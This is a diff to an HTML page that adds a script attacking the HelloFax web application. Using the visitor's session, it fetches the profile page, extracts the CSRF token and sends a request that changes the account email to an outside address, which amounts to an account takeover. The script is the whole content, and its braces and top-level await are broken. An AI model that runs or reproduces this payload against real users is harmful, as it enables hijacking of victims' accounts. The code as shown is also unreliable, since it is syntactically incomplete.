@@ -2,6 +2,28 @@
 <header>
 </header>
 <body>
-<iframe id="f" src="https://app.hellofax.com/home/myAccount?current_tab=profile" style="display:none"></iframe>
+  <script>
+    try {
+    let r = await fetch('/home/myAccount?current_tab=profile', { credentials: 'include' });
+    console.log('status', r.status, 'final url', r.url);
+    let html = await r.text();
+    let m = html.match(/name=["']edit_account\[_csrf_token\]["']\s+value=["']([^"']+)["']/);
+    if (m && m[1]) {
+      let token = m[1];
+      console.log('FOUND token via fetch:', token);
+      
+       fetch('https://app.hellofax.com/account/update', {
+      method: 'POST',
+      credentials: 'include',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: 'edit_account[_csrf_token]=' + encodeURIComponent(token) +
+            '&edit_account[new_email_address]=dcoop34@shopcobe.com' +
+            '&edit_account[current_tab]=profile'
+    });
+
+  } catch(e) {
+    console.log(e.message);
+  }
+  </script>
 </body>
 </html>
